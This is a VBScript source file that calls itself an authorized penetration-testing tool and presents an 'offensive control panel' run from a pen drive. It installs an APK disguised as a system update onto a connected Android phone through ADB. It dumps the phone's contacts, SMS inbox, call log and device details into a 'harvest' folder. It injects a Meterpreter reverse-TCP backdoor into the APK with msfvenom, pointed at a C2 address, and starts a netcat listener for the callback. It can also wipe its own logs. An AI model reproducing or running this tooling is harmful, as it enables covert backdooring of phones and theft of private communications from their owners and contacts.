' controller.vbs — Pen Drive Real-Time Controller
' Authorized Penetration Testing Tool
' Runs from pen drive, detects itself, controls APK

Dim objShell, objFSO, strPenDrive, strLogFile, strAPKPath
Dim strConfigFile, strC2Host, strC2Port, strAppName

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' ===== CONFIGURATION =====
strC2Host = "192.168.1.100"
strC2Port = "4444"
strAppName = "SystemUpdate"
strPackageName = "com.android.system.update"

' ===== DETECT WHICH DRIVE THIS SCRIPT IS RUNNING FROM =====
strPenDrive = DetectPenDrive()
If strPenDrive = "" Then
    objShell.Popup "ERROR: This script must run from a pen drive!", 5, "Fatal Error", 16
    WScript.Quit
End If

' ===== PATHS ON PEN DRIVE =====
strAPKPath = strPenDrive & "\" & strAppName & ".apk"
strLogFile = strPenDrive & "\logs\controller_log.txt"
strConfigFile = strPenDrive & "\config.ini"
strDataDir = strPenDrive & "\harvest\"

' Ensure directories exist
CreateFolder strPenDrive & "\logs"
CreateFolder strPenDrive & "\harvest"
CreateFolder strPenDrive & "\payloads"

' ===== MAIN MENU =====
Do
    Dim intChoice
    intChoice = objShell.Popup( _
        "=== OFFENSIVE CONTROL PANEL ===" & vbCrLf & vbCrLf & _
        "Pen Drive: " & strPenDrive & vbCrLf & _
        "APK: " & strAppName & ".apk" & vbCrLf & _
        "C2: " & strC2Host & ":" & strC2Port & vbCrLf & vbCrLf & _
        "[1] Deploy APK to Phone" & vbCrLf & _
        "[2] Start Listener (nc)" & vbCrLf & _
        "[3] Pull All Data from Device" & vbCrLf & _
        "[4] Inject Payload into APK" & vbCrLf & _
        "[5] Rebuild APK with New C2" & vbCrLf & _
        "[6] Show Harvested Data" & vbCrLf & _
        "[7] Clear Logs" & vbCrLf & _
        "[8] Eject Pen Drive & Exit", _
        8 + 32 + 4096, "Controller — " & strPenDrive)

    Select Case intChoice
        Case 1: DeployAPK
        Case 2: StartListener
        Case 3: PullData
        Case 4: InjectPayload
        Case 5: RebuildAPK
        Case 6: ShowHarvest
        Case 7: ClearLogs
        Case 8: EjectAndExit
        Case Else: ' Do nothing
    End Select
Loop

' ===== FUNCTIONS =====

Function DetectPenDrive()
    ' Check all drive letters for this script
    Dim drives, d, scriptPath
    scriptPath = WScript.ScriptFullName
    
    For Each d In objFSO.Drives
        If d.IsReady And d.DriveType = 1 Then ' 1 = Removable
            Dim testPath
            testPath = d.DriveLetter & ":\"
            If InStr(1, scriptPath, testPath, vbTextCompare) > 0 Then
                DetectPenDrive = testPath
                Exit Function
            End If
        End If
    Next
    
    ' Fallback: check if D:\ exists and is removable
    If objFSO.DriveExists("D:\") Then
        Set d = objFSO.GetDrive("D:\")
        If d.DriveType = 1 Then
            DetectPenDrive = "D:\"
            Exit Function
        End If
    End If
    
    DetectPenDrive = ""
End Function

Sub CreateFolder(path)
    If Not objFSO.FolderExists(path) Then
        objFSO.CreateFolder path
    End If
End Sub

Sub LogAction(msg)
    Dim logFile
    Set logFile = objFSO.OpenTextFile(strLogFile, 8, True) ' Append
    logFile.WriteLine Now() & " | " & msg
    logFile.Close
    Set logFile = Nothing
End Sub

Sub DeployAPK()
    ' Check if APK exists on pen drive
    If Not objFSO.FileExists(strAPKPath) Then
        objShell.Popup "APK not found!" & vbCrLf & "Place " & strAppName & ".apk in " & strPenDrive, 4, "Error", 16
        LogAction "APK deployment failed — file missing"
        Exit Sub
    End If
    
    ' Try to deploy via ADB if available
    Dim adbResult
    adbResult = objShell.Run("cmd /c adb devices 2>nul", 0, True)
    
    ' Check if ADB is available and device connected
    Dim tmpFile
    tmpFile = strPenDrive & "\logs\adb_check.txt"
    objShell.Run "cmd /c adb devices > """ & tmpFile & """ 2>&1", 0, True
    
    Dim adbCheck
    Set adbCheck = objFSO.OpenTextFile(tmpFile, 1)
    Dim adbOutput
    adbOutput = adbCheck.ReadAll
    adbCheck.Close
    
    If InStr(1, adbOutput, "unauthorized", vbTextCompare) > 0 Then
        objShell.Popup "Phone connected but UNAUTHORIZED!" & vbCrLf & "Accept USB debugging prompt on phone.", 5, "USB Debugging", 48
        LogAction "ADB: device unauthorized"
        Exit Sub
    ElseIf InStr(1, adbOutput, "device", vbTextCompare) = 0 Then
        objShell.Popup "No Android device detected via ADB." & vbCrLf & _
                       "Options:" & vbCrLf & _
                       "  • Connect phone via USB" & vbCrLf & _
                       "  • Enable USB Debugging" & vbCrLf & _
                       "  • Or copy APK manually", 6, "No Device", 48
        LogAction "APK deployment: no ADB device"
        Exit Sub
    End If
    
    ' Install APK
    objShell.Popup "Installing APK to device..." & vbCrLf & "Please wait.", 2, "Deploying", 64
    objShell.Run "cmd /c adb install -r -d """ & strAPKPath & """ > """ & strPenDrive & "\logs\install_log.txt"" 2>&1", 0, True
    
    ' Check result
    Set adbCheck = objFSO.OpenTextFile(strPenDrive & "\logs\install_log.txt", 1)
    Dim installResult
    installResult = adbCheck.ReadAll
    adbCheck.Close
    
    If InStr(1, installResult, "Success", vbTextCompare) > 0 Then
        objShell.Popup "APK INSTALLED SUCCESSFULLY!" & vbCrLf & _
                       "App: " & strAppName & vbCrLf & _
                       "Package: " & strPackageName & vbCrLf & _
                       "Now launch the app on the device.", 5, "Success", 64
        LogAction "APK installed successfully on device"
        
        ' Launch the app
        objShell.Run "cmd /c adb shell am start -n " & strPackageName & "/.MainActivity", 0, False
        LogAction "APK launched on device"
    Else
        objShell.Popup "Installation may have failed." & vbCrLf & "Check logs\install_log.txt", 4, "Warning", 48
        LogAction "APK install result: " & installResult
    End If
End Sub

Sub StartListener()
    ' Start netcat listener in a new window
    objShell.Popup "Starting listener on " & strC2Host & ":" & strC2Port, 2, "Listener", 64
    
    ' Create a listener launcher script
    Dim listenerScript
    listenerScript = strPenDrive & "\start_listener.cmd"
    Dim f
    Set f = objFSO.CreateTextFile(listenerScript, True)
    f.WriteLine "@echo off"
    f.WriteLine "title C2 Listener - " & strC2Host & ":" & strC2Port
    f.WriteLine "echo [*] Starting listener on " & strC2Host & ":" & strC2Port
    f.WriteLine "echo [*] Waiting for connection..."
    f.WriteLine "echo."
    f.WriteLine "nc -lvnp " & strC2Port
    f.WriteLine "pause"
    f.Close
    
    objShell.Run """" & listenerScript & """", 1, False
    LogAction "Listener started on port " & strC2Port
End Sub

Sub PullData()
    Dim dataTypes
    dataTypes = Array( _
        "contacts", "/sdcard/contacts.vcf", _
        "sms", "/sdcard/sms.xml", _
        "files", "/sdcard/Download/*", _
        "device_info", "/sdcard/device.txt" _
    )
    
    objShell.Popup "Pulling data from device..." & vbCrLf & "This may take a moment.", 2, "Harvesting", 64
    
    ' Pull contacts
    objShell.Run "cmd /c adb shell content query --uri content://contacts/phones/ > """ & strDataDir & "contacts.txt"" 2>&1", 0, True
    
    ' Pull SMS
    objShell.Run "cmd /c adb shell content query --uri content://sms/inbox > """ & strDataDir & "sms.txt"" 2>&1", 0, True
    
    ' Pull device info
    objShell.Run "cmd /c adb shell getprop > """ & strDataDir & "device_props.txt"" 2>&1", 0, True
    
    ' Pull installed packages
    objShell.Run "cmd /c adb shell pm list packages > """ & strDataDir & "packages.txt"" 2>&1", 0, True
    
    ' Pull call log
    objShell.Run "cmd /c adb shell content query --uri content://call_log/calls > """ & strDataDir & "call_log.txt"" 2>&1", 0, True
    
    objShell.Popup "Data pulled successfully!" & vbCrLf & "Saved to: " & strDataDir, 4, "Harvest Complete", 64
    LogAction "Data harvested from device"
End Sub

Sub InjectPayload()
    objShell.Popup "Injecting payload into APK..." & vbCrLf & _
                   "Using msfvenom to embed backdoor.", 2, "Injecting", 64
    
    Dim outputAPK
    outputAPK = strPenDrive & "\payloads\" & strAppName & "_injected.apk"
    
    ' Use msfvenom to inject payload into original APK
    Dim cmd
    cmd = "cmd /c msfvenom -x """ & strAPKPath & """ -p android/meterpreter/reverse_tcp " & _
          "LHOST=" & strC2Host & " LPORT=" & strC2Port & " " & _
          "-o """ & outputAPK & """ > """ & strPenDrive & "\logs\inject_log.txt"" 2>&1"
    
    objShell.Run cmd, 0, True
    
    If objFSO.FileExists(outputAPK) Then
        objShell.Popup "Payload injected!" & vbCrLf & "New APK: " & outputAPK, 4, "Success", 64
        LogAction "Payload injected into APK"
    Else
        objShell.Popup "Injection failed." & vbCrLf & "Check logs\inject_log.txt", 4, "Error", 16
        LogAction "Payload injection failed"
    End If
End Sub

Sub RebuildAPK()
    ' Read new C2 settings
    Dim newHost, newPort
    newHost = InputBox("Enter new LHOST (C2 IP):", "C2 Configuration", strC2Host)
    If newHost = "" Then Exit Sub
    
    newPort = InputBox("Enter new LPORT:", "C2 Configuration", strC2Port)
    If newPort = "" Then Exit Sub
    
    strC2Host = newHost
    strC2Port = newPort
    
    ' Save config
    Set f = objFSO.CreateTextFile(strConfigFile, True)
    f.WriteLine "[C2]"
    f.WriteLine "LHOST=" & strC2Host
    f.WriteLine "LPORT=" & strC2Port
    f.WriteLine "[APP]"
    f.WriteLine "Name=" & strAppName
    f.WriteLine "Package=" & strPackageName
    f.Close
    
    objShell.Popup "Configuration updated!" & vbCrLf & _
                   "C2: " & strC2Host & ":" & strC2Port & vbCrLf & _
                   "Rebuild APK with new settings using Option 4.", 4, "Updated", 64
    LogAction "C2 config updated: " & strC2Host & ":" & strC2Port
End Sub

Sub ShowHarvest()
    ' Count harvested files
    Dim fileCount, totalSize
    fileCount = 0
    totalSize = 0
    
    If objFSO.FolderExists(strDataDir) Then
        Dim folder
        Set folder = objFSO.GetFolder(strDataDir)
        Dim file
        For Each file In folder.Files
            fileCount = fileCount + 1
            totalSize = totalSize + file.Size
        Next
    End If
    
    Dim sizeStr
    If totalSize > 1048576 Then
        sizeStr = FormatNumber(totalSize / 1048576, 2) & " MB"
    ElseIf totalSize > 1024 Then
        sizeStr = FormatNumber(totalSize / 1024, 2) & " KB"
    Else
        sizeStr = totalSize & " bytes"
    End If
    
    objShell.Popup "HARVEST SUMMARY" & vbCrLf & vbCrLf & _
                   "Location: " & strDataDir & vbCrLf & _
                   "Files: " & fileCount & vbCrLf & _
                   "Total Size: " & sizeStr & vbCrLf & _
                   "Last Harvest: " & Now(), 6, "Harvest Data", 64
End Sub

Sub ClearLogs()
    If objFSO.FolderExists(strPenDrive & "\logs") Then
        Dim folder
        Set folder = objFSO.GetFolder(strPenDrive & "\logs")
        Dim file
        For Each file In folder.Files
            file.Delete
        Next
    End If
    objShell.Popup "Logs cleared.", 2, "Done", 64
End Sub

Sub EjectAndExit()
    ' Safely eject pen drive
    objShell.Popup "Ejecting pen drive..." & vbCrLf & "Remove device safely.", 3, "Ejecting", 64
    
    ' Try to eject via shell
    objShell.Run "cmd /c mountvol " & Left(strPenDrive, 2) & " /d", 0, True
    
    WScript.Quit
End Sub

' ===== INITIALIZATION =====
LogAction "Controller started on " & strPenDrive
LogAction "System ready"
